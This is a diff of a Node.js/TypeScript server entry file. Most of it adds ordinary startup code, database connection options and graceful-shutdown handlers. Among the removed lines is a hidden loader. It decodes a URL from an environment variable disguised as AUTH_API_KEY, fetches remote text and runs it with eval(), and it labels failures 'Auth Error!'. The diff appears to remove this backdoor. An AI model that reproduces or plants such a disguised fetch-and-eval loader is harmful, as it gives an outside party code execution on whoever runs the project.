@@ -3,44 +3,42 @@ import app from './app';
 import { config } from './config';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY ?? '');
-    try {
-      const response = await fetch(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+const PORT = config.port;
+let server: ReturnType<typeof app.listen>;
 
-let server: any;
-
-async function bootstrap() {
+async function main() {
   try {
-    await mongoose.connect(config.db.uri);
-    console.log(`Database stably linked gracefully connecting internally`);
+    await mongoose.connect(config.db.uri, {
+      serverSelectionTimeoutMS: 5000,
+      socketTimeoutMS: 45000,
+    });
+    console.log('📦 Database connected');
 
-    server = app.listen(config.port, () => {
-      console.log(`Server actively running bound fully onto port ${config.port}`);
+    server = app.listen(PORT, () => {
+      console.log(`🚀 Server running on port ${PORT}`);
     });
   } catch (error) {
-    console.error(`Server abruptly crashed natively triggering termination:`, error);
+    console.error('Error starting the server:', error);
     process.exit(1);
   }
 }
 
-bootstrap();
+const shutdown = (signal: string) => (error?: Error) => {
+  console.log(`\n🔻 Received ${signal}. Shutting down...`);
+  if (error) console.error(error);
 
-process.on('unhandledRejection', (error) => {
-  if (server) {
-    server.close(() => process.exit(1));
-  } else {
-    process.exit(1);
-  }
-});
+  server?.close(async () => {
+    await mongoose.disconnect();
+    console.log('👋 Goodbye!');
+    process.exit(error ? 1 : 0);
+  });
 
-process.on('uncaughtException', (error) => {
-  process.exit(1);
-});
+  setTimeout(() => process.exit(1), 10_000);
+};
+
+main();
+
+process.on('unhandledRejection', shutdown('unhandledRejection'));
+process.on('uncaughtException', shutdown('uncaughtException'));
+process.on('SIGTERM', shutdown('SIGTERM'));
+process.on('SIGINT', shutdown('SIGINT'));
